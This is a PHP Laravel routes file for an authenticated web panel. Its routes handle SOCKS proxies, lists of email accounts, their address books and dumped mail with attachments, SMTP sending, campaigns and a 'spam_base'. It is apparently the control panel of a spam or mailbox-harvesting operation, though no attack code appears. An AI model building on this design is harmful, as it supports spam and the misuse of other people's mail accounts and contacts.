<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::middleware(['auth.basic:web,login'])->group(function () {
	Route::get('/', 'CampaignsController@index');

	// Route::resource handles common CRUD shit
	// Route::resource('socks', 'SocksController');
	Route::get('socks', 'SocksController@index');
	Route::get('cmr', 'CheckMailReceiverController@index');
	Route::get('{acc_type}', array('as' => 'acc.type', 'uses' => 'EmailAccountsController@index'))->where('acc_type', '(mail_accs|test_accs)');
	Route::get('/acc_addressbook/{id}', 'EmailAccountsController@addressbook');
	Route::get('/mail_dump/{id}', 'EmailAccountsController@maildump');
	Route::get('/mail_dump/attach/{id}/{att_id?}', 'EmailAccountsController@getMailDumpAttach');
	Route::post('/acc_ab_mass_update', 'EmailAccountsController@massUpdate');
	Route::post('/acc_md_mass_update', 'EmailAccountsController@mailDumpMassUpdate');
	// Route::get('test_accs', 'EmailAccountsController@index');
	// Route::get('mail_accs', 'EmailAccountsController@index');

	Route::get('/smtp-stop', 'CampaignsController@smtpStop')->name('smtp_stop');
	Route::get('/smtp-start', 'CampaignsController@smtpStart')->name('smtp_start');

	Route::get('campaigns/new', 'CampaignsController@new');
	Route::get('campaigns/show/{id}', 'CampaignsController@show');
	Route::get('campaigns/{cid}/status/{sid}', 'CampaignsController@updateStatus');
	Route::get('campaigns/{cid}/remove', 'CampaignsController@remove');
	Route::get('campaigns', 'CampaignsController@index');
	Route::get('campaign/details/{id}/', 'CampaignsController@details');
	Route::get('send_rules', 'SendRulesController@index');

	Route::name('spam_base.')->prefix('spam_base')->group(function(){
		Route::get('all', 'SpamBaseController@index')->name('all');
		Route::get('new', 'SpamBaseController@new')->name('new');
		Route::get('show/{id}', 'SpamBaseController@show')->name('show');
	});

	Route::name('settings.')->prefix('settings')->group(function(){
		Route::get('/', 'SystemSettingsController@index')->name('index');
	});

	Route::get('attachments', 'AttachmentsController@index')->name('attachments');
	Route::get('macros', 'MacrosController@index')->name('macros');

});